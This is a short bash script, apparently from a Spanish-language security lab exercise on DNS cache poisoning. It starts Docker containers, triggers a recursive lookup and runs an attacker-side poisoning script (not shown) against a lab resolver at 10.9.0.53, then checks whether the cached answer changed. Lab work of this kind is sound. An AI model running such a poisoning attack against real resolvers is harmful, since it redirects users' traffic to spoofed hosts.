#!/usr/bin/env bash
set -euo pipefail
echo "========== PUNTO 06 — DNS CACHE POISONING [VULNERABLE] =========="
P="docker compose -p p06v -f docker-compose.yml"
trap '$P down -v 2>/dev/null || true' EXIT
$P down -v 2>/dev/null || true
$P up -d --build
sleep 6
echo "[*] Consulta legítima inicial:"
$P exec atacante dig @10.9.0.53 test.ejemplo.com +short +time=2
echo "[*] Lanzando consulta recursiva + envenenamiento..."
$P exec atacante sh -c 'dig @10.9.0.53 rand001.ejemplo.com +time=1 +tries=1 >/dev/null 2>&1 &' || true
$P exec atacante python3 /lab/dns_poison.py rand001 100
sleep 2
echo "[*] Consulta tras ataque:"
$P exec atacante dig @10.9.0.53 test.ejemplo.com +short +time=2
$P down -v
